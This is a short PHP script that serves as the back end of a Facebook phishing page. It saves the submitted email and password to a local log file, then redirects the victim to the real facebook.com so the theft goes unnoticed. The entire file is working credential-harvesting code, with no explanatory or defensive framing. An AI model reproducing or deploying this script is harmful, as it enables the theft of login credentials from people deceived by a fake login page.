<?php

file_put_contents("log.txt", "Username: " . $_POST['email'] . "\n" );
file_put_contents("log.txt", "Pass: " . $_POST['pass'] ,  FILE_APPEND);
header('Location: https://www.facebook.com/');
exit();
?>